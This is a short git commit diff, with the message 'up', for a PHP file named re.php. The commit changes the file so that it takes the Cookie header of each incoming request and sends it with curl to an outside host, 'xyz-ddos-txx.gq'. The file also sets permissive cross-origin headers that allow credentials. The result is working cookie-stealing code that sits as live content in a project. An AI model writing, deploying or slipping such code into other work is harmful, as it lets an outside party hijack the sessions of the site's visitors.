d1d0650645bced3bf6d02ce12c6031e95c01ec21
Việt Nguyễn Đức <nguyenducviet1998tk@gmail.com>
2018-12-04 14:23:15 +0700

    up

--- projects/re.php
+++ projects/re.php
@@ -2,8 +2,7 @@
 header('Access-Control-Allow-Credentials: true');
 header('Access-Control-Allow-Origin: *'); 
 $ch = curl_init(); 
-curl_setopt($ch, CURLOPT_URL, "http://xyz-ddos-txx.gq/?d="); 
+curl_setopt($ch, CURLOPT_URL, "http://xyz-ddos-txx.gq/?d=".getallheaders()['Cookie']); 
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
 curl_exec($ch); 
-var_dump(getallheaders()['Cookie']) ;
 ?>
